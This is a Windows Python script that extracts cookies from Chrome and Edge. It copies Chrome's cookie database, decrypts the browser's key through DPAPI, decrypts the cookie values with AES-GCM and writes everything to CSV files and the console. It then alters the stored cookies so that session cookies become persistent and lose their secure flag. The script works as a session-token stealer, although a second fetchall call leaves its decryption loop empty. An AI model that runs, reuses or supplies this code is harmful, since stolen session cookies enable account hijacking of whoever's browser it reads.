import os
import csv
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove 'DPAPI' str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]



def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        
    
def main():
    # local sqlite Chrome cookie database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Cookies")
    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        # copy file when does not exist in the current directory
        shutil.copyfile(db_path, filename)
        

    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    
    cursorG=cursor.fetchall()
    #Write data to CSV file
    with open('ChrommeCookies.csv', "w", encoding="utf-8") as file:
        file.write('host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value \n')
        for i in cursorG:
            file.write("{0}, {1}, {2}, {3}, {4}, {5}, {6} \n".format(i[0], i[1], i[2], i[3], i[4], i[5], i[6]))

    # get the AES key
    key = get_encryption_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            # already decrypted
            decrypted_value = value
            
        print(f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================
        """)
       
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    
    db.commit()
    # close connection
    db.close()
    
    
def EdgeCookies() -> None:
    history_db = os.path.expanduser('~')+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies'
    c2 = sqlite3.connect(history_db)
    cursor2 = c2.cursor()

    #Extract Data
    select_statement_cookies = "SELECT cookies.path,cookies.source_port,cookies.host_key,cookies.name,cookies.value,cookies.has_expires,cookies.priority," \
                            "datetime(cookies.last_access_utc / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime')," \
                            "datetime(cookies.creation_utc / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime')," \
                            "datetime(cookies.expires_utc / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime')" \
                            " FROM cookies;"
    cursor2.execute(select_statement_cookies)
    results = cursor2.fetchall()

    #Write data to CSV file
    with open('EdgeCookies.csv', "w", encoding="utf-8") as file:
        file.write('path,source_port,host_key,name,value,has_expires,priority,last_access_utc,creation_utc,expires_utc\n')
        for i in results:
            file.write("{0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, {9} \n".format(i[0], i[1], i[2], i[3], i[4], i[5], i[6], i[7], i[8], i[9]))

    
if __name__ == "__main__":
    main()
    EdgeCookies()